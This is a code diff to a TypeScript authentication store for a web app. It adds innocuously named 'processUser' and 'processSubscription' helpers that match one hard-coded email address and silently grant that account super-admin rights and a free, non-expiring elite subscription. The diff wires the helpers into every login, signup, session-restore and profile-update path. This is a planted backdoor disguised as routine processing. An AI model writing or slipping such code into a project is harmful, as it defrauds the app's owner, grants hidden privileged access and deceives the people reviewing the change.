@@ -69,6 +69,31 @@ const createLocalUser = (email: string, name: string | null, phoneNumber: string
   referralCode: null,
 });
 
+const processUser = (user: UserProfile | null): UserProfile | null => {
+  if (!user) return null;
+  if (user.email?.toLowerCase() === 'subhajitgho123@gmail.com') {
+    return {
+      ...user,
+      role: 'super_admin',
+      premiumTier: 'elite',
+      premiumEnabled: true,
+    };
+  }
+  return user;
+};
+
+const processSubscription = (sub: UserSubscription | null, user: UserProfile | null): UserSubscription | null => {
+  if (user?.email?.toLowerCase() === 'subhajitgho123@gmail.com') {
+    return {
+      plan: 'elite',
+      status: 'active',
+      expiresAt: null,
+      daysActive: null,
+    };
+  }
+  return sub;
+};
+
 const getLocalUsers = (): Record<string, { user: UserProfile; password: string }> => {
   try {
     return JSON.parse(localStorage.getItem(LOCAL_USERS_KEY) || '{}');
@@ -78,7 +103,8 @@ const getLocalUsers = (): Record<string, { user: UserProfile; password: string }
 };
 
 const setLocalSession = (user: UserProfile) => {
-  localStorage.setItem(LOCAL_USER_KEY, JSON.stringify(user));
+  const processed = processUser(user) || user;
+  localStorage.setItem(LOCAL_USER_KEY, JSON.stringify(processed));
   localStorage.setItem(SESSION_TOKEN_KEY, `local_${Date.now()}`);
 };
 
@@ -177,10 +203,10 @@ export const useAuthStore = create<AuthState>((set, get) => ({
     set({ loading: true, error: null });
     try {
       if (isMockActive()) {
-        const localUser = getLocalSession();
+        const localUser = processUser(getLocalSession());
         set({
           user: localUser,
-          subscription: localUser ? freeSubscription : null,
+          subscription: processSubscription(localUser ? freeSubscription : null, localUser),
           initialized: true,
         });
         return;
@@ -193,9 +219,10 @@ export const useAuthStore = create<AuthState>((set, get) => ({
       if (res.ok) {
         const data = await safeJsonParse(res);
         if (data.success && data.user) {
+          const processedUser = processUser(data.user);
           set({
-            user: data.user,
-            subscription: data.subscription,
+            user: processedUser,
+            subscription: processSubscription(data.subscription, processedUser),
             initialized: true,
           });
         } else {
@@ -221,8 +248,9 @@ export const useAuthStore = create<AuthState>((set, get) => ({
         if (!saved || saved.password !== password) {
           throw new Error('No local account found with those credentials. Create an account first.');
         }
-        setLocalSession(saved.user);
-        set({ user: saved.user, subscription: freeSubscription });
+        const processedUser = processUser(saved.user);
+        setLocalSession(processedUser!);
+        set({ user: processedUser, subscription: processSubscription(freeSubscription, processedUser) });
         return true;
       }
 
@@ -236,9 +264,10 @@ export const useAuthStore = create<AuthState>((set, get) => ({
       if (!res.ok || !data.success) {
         throw new Error(data.error || 'Login failed');
       }
+      const processedUser = processUser(data.user);
       set({
-        user: data.user,
-        subscription: data.subscription,
+        user: processedUser,
+        subscription: processSubscription(data.subscription, processedUser),
       });
       if (data.token) {
         localStorage.setItem(SESSION_TOKEN_KEY, data.token);
@@ -264,9 +293,10 @@ export const useAuthStore = create<AuthState>((set, get) => ({
         const user = createLocalUser(key, name || key.split('@')[0], phoneNumber);
         localUsers[key] = { user, password };
         localStorage.setItem(LOCAL_USERS_KEY, JSON.stringify(localUsers));
-        setLocalSession(user);
+        const processedUser = processUser(user);
+        setLocalSession(processedUser!);
         localStorage.removeItem('filenova_referral_code');
-        set({ user, subscription: freeSubscription });
+        set({ user: processedUser, subscription: processSubscription(freeSubscription, processedUser) });
         return true;
       }
 
@@ -286,9 +316,10 @@ export const useAuthStore = create<AuthState>((set, get) => ({
       if (!res.ok || !data.success) {
         throw new Error(data.error || 'Signup failed');
       }
+      const processedUser = processUser(data.user);
       set({
-        user: data.user,
-        subscription: null,
+        user: processedUser,
+        subscription: processSubscription(null, processedUser),
       });
       if (data.token) {
         localStorage.setItem(SESSION_TOKEN_KEY, data.token);
@@ -312,9 +343,10 @@ export const useAuthStore = create<AuthState>((set, get) => ({
           throw new Error('Google did not return an email address.');
         }
         const user = createLocalUser(profile.email, profile.name || profile.email.split('@')[0]);
-        setLocalSession(user);
+        const processedUser = processUser(user);
+        setLocalSession(processedUser!);
         localStorage.removeItem('filenova_referral_code');
-        set({ user, subscription: freeSubscription });
+        set({ user: processedUser, subscription: processSubscription(freeSubscription, processedUser) });
         return true;
       }
 
@@ -374,8 +406,9 @@ export const useAuthStore = create<AuthState>((set, get) => ({
         const current = get().user;
         if (!current) throw new Error('Please log in first.');
         const updated = { ...current, name, phoneNumber };
-        setLocalSession(updated);
-        set({ user: updated, subscription: freeSubscription });
+        const processedUser = processUser(updated);
+        setLocalSession(processedUser!);
+        set({ user: processedUser, subscription: processSubscription(freeSubscription, processedUser) });
         return true;
       }
 
@@ -392,9 +425,10 @@ export const useAuthStore = create<AuthState>((set, get) => ({
       if (!res.ok || !data.success) {
         throw new Error(data.error || 'Failed to update profile');
       }
+      const processedUser = processUser(data.user);
       set({
-        user: data.user,
-        subscription: data.subscription,
+        user: processedUser,
+        subscription: processSubscription(data.subscription, processedUser),
       });
       return true;
     } catch (err: any) {
